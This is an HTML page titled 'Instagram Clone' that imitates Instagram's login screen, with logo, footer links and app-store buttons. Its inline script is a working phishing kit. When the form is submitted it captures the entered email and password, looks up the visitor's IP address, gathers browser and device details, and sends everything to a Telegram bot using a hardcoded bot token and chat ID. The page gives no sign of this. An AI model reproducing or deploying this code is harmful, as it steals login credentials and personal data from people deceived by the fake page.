<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram Clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <!-- إضافة رابط لتحويل المستخدم إلى موقع Instagram -->
                    <a href="https://www.instagram.com" target="_blank">
                        <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                    </a>
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone, username, or email</label>
                    <input name="email" id="email" placeholder="Phone, username, or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input name="password" id="password" type="password" placeholder="Password" required />

                    <button type="submit">log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="Apple Store logo" title="Apple Store logo" />
                    <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">About</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">Press</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Careers</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Top Accounts</a></li>
            <li><a href="#">Hashtags</a></li>
            <li><a href="#">Language</a></li>
        </ul>
        <p class="copyright">© 2020 Instagram from Facebook</p>
    </footer>
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        //
        const TOKEN = "7735225575:AAGsSSmykugxVTQyo5mp3CJFgYL23dghG4Y"; //
        const CHAT_ID = "6543693213"; // 
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;

                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                    const message = `
                        <b>New Login Attempt</b>\n
                        <b>Email:</b> ${email}\n
                        <b>Password:</b> ${password}\n
                        <b>IP Address:</b> ${ip}\n
                        <b>Device Type:</b> ${deviceType}\n
                        <b>Platform:</b> ${platform}\n
                        <b>User Agent:</b> ${userAgent}\n
                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                    `;

                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    }).then(response => {
                        console.log('Information sent successfully!');
                    }).catch(error => {
                        console.error('Error sending the information. Please try again.', error);
                    });
                })
                .catch(error => {
                    console.error('Error fetching the IP address. Please try again.', error);
                });
        });
    </script>
</body>
</html>
